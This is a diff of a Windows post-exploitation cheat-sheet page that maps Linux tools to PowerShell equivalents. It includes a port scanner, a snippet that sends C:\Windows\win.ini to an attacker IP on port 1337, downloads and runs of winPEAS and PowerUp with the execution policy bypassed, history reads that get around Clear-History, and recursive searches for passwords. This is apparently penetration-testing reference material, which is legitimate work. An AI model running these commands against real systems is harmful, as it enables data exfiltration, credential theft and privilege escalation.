@@ -12,37 +12,73 @@ A list of **builtin** Windows binaries and commands that can _download_, _execut
 
 ## Windows actions
 
-Some common commands you'll find yourself using in many situations. When a windows machine is compromised you must sometimes live with the binaries that it has, so these code snippets contain the Windows-equivalent to some Linux utilities:
+Some common commands you'll find yourself using in many situations. When a Windows machine is compromised you must sometimes live with the binaries that it has, so these code snippets contain the Windows-equivalent to some Linux utilities:
 
-{% code title="nc -v $IP $PORT" %}
-```powershell
-Test-NetConnection -Port 22 10.10.10.10
-```
-{% endcode %}
+<pre class="language-powershell" data-title="nc -v $IP $PORT"><code class="lang-powershell"><strong>Test-NetConnection -Port 22 10.10.10.10
+</strong></code></pre>
 
-{% code title="nmap -p $PORTS $IP" overflow="wrap" %}
-```powershell
-1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "TCP port $_ is open"} 2>$null
-```
-{% endcode %}
+<pre class="language-powershell" data-title="nmap -p $PORTS $IP" data-overflow="wrap"><code class="lang-powershell"><strong>1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "TCP port $_ is open"} 2>$null
+</strong></code></pre>
 
 &#x20;<mark style="color:blue;">**↳**</mark> The above loop is **very slow** because it goes through ports one by one with a timeout
 
-{% code title="SMB: List shares on dc01" %}
-```powershell
-net view \\dc01 /all
-```
-{% endcode %}
+<pre class="language-powershell" data-title="SMB: List shares on dc01"><code class="lang-powershell"><strong>net view \\dc01 /all
+</strong></code></pre>
 
-{% code title="Interactive netcat" %}
-```
-dism /online /Enable-Feature /FeatureName:TelnetClient
+<pre class="language-powershell" data-title="Interactive netcat"><code class="lang-powershell">dism /online /Enable-Feature /FeatureName:TelnetClient
 
-telnet 192.168.50.8 25
-```
-{% endcode %}
+<strong>telnet 10.10.10.10 25  # SMTP
+</strong></code></pre>
 
 &#x20;<mark style="color:blue;">**↳**</mark> This feature needs to be already enabled, or enabled by you as an administrator
+
+{% code title="wget $URL -O $FILE" %}
+```powershell
+iwr http://10.10.10.10/file.txt -o file.txt
+```
+{% endcode %}
+
+<pre class="language-powershell" data-title="nc $IP $PORT < $FILE"><code class="lang-powershell">$client = New-Object System.Net.Sockets.TcpClient
+<strong>$client.Connect("10.10.10.10", 1337)
+</strong>$writer = New-Object System.IO.StreamWriter($client.GetStream())
+<strong>$bytes = (Get-Content -Encoding byte "C:\Windows\win.ini")
+</strong>$writer.BaseStream.Write($bytes, 0, $bytes.Length)
+$writer.Flush()
+</code></pre>
+
+{% code title="sudo" %}
+```powershell
+runas /user:j0r1an powershell  # local
+runas /user:corp\j0r1an powershell  # domain
+```
+{% endcode %}
+
+<pre class="language-powershell" data-title="find"><code class="lang-powershell"><strong>Get-ChildItem -File -Recurse -ErrorAction SilentlyContinue
+</strong></code></pre>
+
+<pre class="language-powershell" data-title="grep -ri $PATTERN"><code class="lang-powershell"><strong>dir -Recurse | Select-String -Pattern "password"
+</strong></code></pre>
+
+<pre class="language-powershell" data-title="history" data-overflow="wrap"><code class="lang-powershell"><strong>Get-History
+</strong># Raw method below can bypass Clear-History
+<strong>type (Get-PSReadlineOption).HistorySavePath
+</strong># Get verbose script block events (may be large)
+<strong>Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath "*[System[EventID=4104]]" | Export-Csv -Path 'ScriptBlockEvents.csv' -NoTypeInformation
+</strong></code></pre>
+
+<pre class="language-powershell" data-title="./linpeas.sh" data-overflow="wrap" data-full-width="false"><code class="lang-powershell"><strong>iwr https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o winPEAS.exe; .\winPEAS.exe | Tee-Object winPEAS.txt
+</strong>
+# Another quick tool is PowerUp.ps1, containing some auto-exploitable functions
+<strong>iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -o PowerUp.ps1
+</strong><strong>powershell -ep bypass
+</strong><strong>. .\PowerUp.ps1
+</strong><strong>Invoke-PrivescAudit
+</strong></code></pre>
+
+<pre class="language-powershell" data-title="Get ACEs from username" data-overflow="wrap"><code class="lang-powershell">Import-Module .\PowerView.ps1
+<strong>$sid = (get-domainuser j0r1an).objectsid
+</strong><strong>Get-ObjectACL | ? {$_.SecurityIdentifier -eq $sid} | select ObjectDN,ActiveDirectoryRights
+</strong></code></pre>
 
 ### Powershell Reverse Shell
 
